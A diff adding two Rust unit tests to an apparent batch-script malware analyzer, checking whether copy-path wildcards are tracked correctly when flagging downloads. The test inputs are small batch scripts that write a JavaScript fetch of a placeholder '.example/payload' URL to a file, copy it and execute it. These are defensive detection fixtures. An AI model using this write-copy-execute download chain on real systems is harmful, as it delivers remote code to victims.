@@ -15973,6 +15973,40 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn copy_path_wildcard_does_not_match_nested_child() {
+        let report = crate::analyze(
+            br#"echo fetch('https://copy-wildcard-nested-wrong.example/payload') > C:\Work\Sub\original.js
+copy /y C:\Work\*.js C:\Temp\
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://copy-wildcard-nested-wrong.example/payload")
+            }),
+            "copy path wildcard matched nested child content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copy_path_wildcard_matches_direct_child() {
+        let report = crate::analyze(
+            br#"echo fetch('https://copy-wildcard-direct.example/payload') > C:\Work\original.js
+copy /y C:\Work\*.js C:\Temp\
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://copy-wildcard-direct.example/payload")
+            }),
+            "copy path wildcard did not match direct child content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn xcopy_i_wildcard_directory_preserves_generated_script_content() {
         let report = crate::analyze(
             br#"echo fetch('https://xcopy-wildcard-dir.example/payload') > original.js
